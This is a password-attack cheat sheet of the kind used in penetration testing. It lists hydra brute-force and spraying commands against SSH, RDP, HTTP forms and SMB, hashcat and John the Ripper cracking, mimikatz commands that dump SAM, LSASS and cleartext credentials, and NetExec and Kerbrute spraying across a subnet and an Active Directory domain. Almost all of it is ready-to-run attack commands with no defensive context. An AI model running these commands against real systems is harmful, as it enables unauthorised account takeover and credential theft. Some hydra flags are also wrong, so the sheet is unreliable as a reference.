# Password Attack

## Password Attacks

### Dictionary Attack

Uses a wordlist of passwords to attempt authentication against an user.

```
hydra -L <user> -P <pass_list>.txt <ip> <service>
```

* Example: `hydra -L root -P passwords.txt 192.168.1.100 ssh`

### Password Spray

Tries a single password across multiple usernames to avoid lockouts.

```
hydra -l <user_list>.txt -p <password> <ip> <service>
```

* Example: `hydra -l users.txt -p Password123 192.168.1.100 rdp`

### Bruteforce Attack

Attempts all combinations of usernames and passwords from wordlists.

```
hydra -L <user_list>.txt -P <pass_list>.txt <ip> <service>
```

* Example: `hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/index.php:user=^USER^&pwd=^PASS^:Login failed"`&#x20;

## Service Attacks

### RDP Attack

Tests credentials for Remote Desktop Protocol access.

```
xfreerdp /u:<user> /p:<pass> /v:<target_ip> /cert:ignore
```

* Example: `xfreerdp /u:admin /p:Password123 /v:192.168.1.100 /cert:ignore`

### HTTP Basic Authentication Attack

Attacks HTTP basic authentication using GET method.

```
hydra -L <user_list>.txt -P <pass_list>.txt <target_ip> http-get /<path>
```

* Example: `hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /admin`

### HTTP Form Attack

Attacks web forms with custom POST parameters.

{% code overflow="wrap" %}

```
hydra -L <user_list>.txt -P <pass_list>.txt <target_ip> http-post-form "<path>:<form_params>:<error_message>"
```

{% endcode %}

* Example: `hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/index.php:user=^USER^&pwd=^PASS^:Login failed"`

### SMB Attack

Tests credentials against SMB services.

```
hydra -L <user_list>.txt -P <pass_list>.txt <target_ip> smb
```

* Example: `hydra -L users.txt -P passwords.txt 192.168.1.100 smb`

## Password Cracking

### Identify Hash Type

Determines the type of a given hash.

```
echo -n '<hash>' | hashid
```

* Example: `echo -n '5f4dcc3b5aa765d61d8327deb882cf99' | hashid`

### Hashcat

#### Generate Wordlist with Rules

Creates a wordlist using hashcat rules for password variations.

```
hashcat -r <rule_file> --stdout <wordlist>.txt
```

* Example: `hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt`

#### Find Hashcat Mode

Searches for the hashcat mode for a specific hash type.

```
hashcat --help | grep -i "<hash_type>"
```

* Example: `hashcat --help | grep -i "KeePass"`

#### Crack with Hashcat

Cracks hashes using a wordlist and optional rules.

```
hashcat -m <mode> -a 0 <hash_file> <wordlist>.txt
```

* Example: `hashcat -m 1000 -a 0 hashes.txt passwords.txt`

### John the Ripper

#### John with Custom Rules

Uses custom rules for John the Ripper by adding to config.

```
# Add to /etc/john/john.conf: [List.Rules:<rule_name>]
john --rules=<rule_name> <hash_file>
```

* Example: `john --rules=sshRules hashes.txt`

#### Crack with John

Cracks hashes using John the Ripper with a wordlist.

```
john --wordlist=<wordlist>.txt <hash_file>
```

* Example: `john --wordlist=passwords.txt hashes.txt`

## Windows Password Dumping

### Dump SAM File

Extracts credentials from SAM and SYSTEM files.

```bash
# Boot from another OS, copy C:\Windows\System32\config\sam and system, then:
mimikatz# lsadump::sam
```

### Dump Cleartext Passwords

Extracts cleartext passwords from memory.

```bash
mimikatz# privilege::debug
mimikatz# token::elevate
mimikatz# sekurlsa::logonpasswords
```

### Dump LSASS Memory

Dumps LSASS process memory to extract credentials.

```bash
mimikatz# privilege::debug
mimikatz# sekurlsa::minidump lsass.dmp
```

* Example: `mimikatz# sekurlsa::minidump lsass.dmp`

### Inject Fake Keylogger DLL

Captures credentials by injecting a fake keylogger DLL.

```bash
mimikatz# misc::memssp
```

## Additional Tools

### NetExec

Tests credentials across a network for SMB, WinRM, or other services.

```
netexec <protocol> <target_ip> -u <user_list>.txt -p <pass_list>.txt
```

* Example: `netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt`

### Kerbrute

Enumerates and attacks Active Directory accounts via Kerberos.

```
kerbrute passwordspray -d <domain> <user_list>.txt <password>
```

* Example: `kerbrute passwordspray -d corp.local users.txt Password123`
